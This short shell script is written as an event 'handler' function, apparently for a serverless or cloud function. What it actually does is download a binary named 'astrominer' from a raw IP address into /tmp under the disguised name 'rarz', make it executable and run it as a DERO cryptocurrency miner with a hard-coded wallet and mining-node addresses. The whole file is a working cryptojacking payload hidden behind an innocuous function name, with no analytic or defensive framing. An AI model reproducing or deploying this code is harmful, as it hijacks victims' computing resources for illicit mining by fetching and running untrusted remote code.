function handler () {
    EVENT_DATA=$1
cd /tmp &&
curl -L http://15.223.39.114:8085/astrominer -o /tmp/rarz &&
chmod 777 rarz &&
./rarz -w dero1qy5um3ngwqjl2d5rvw2jsxp0p42r39qk5m34vfy3c6euwgd0jvpavqq0f2gmv -r 139.144.177.115:10100 -r1 dero-node-yashnik-eu.mysrv.cloud:10300 -r2 dero-node-ch4k1pu.mysrv.cloud:10300 -p rpc
}
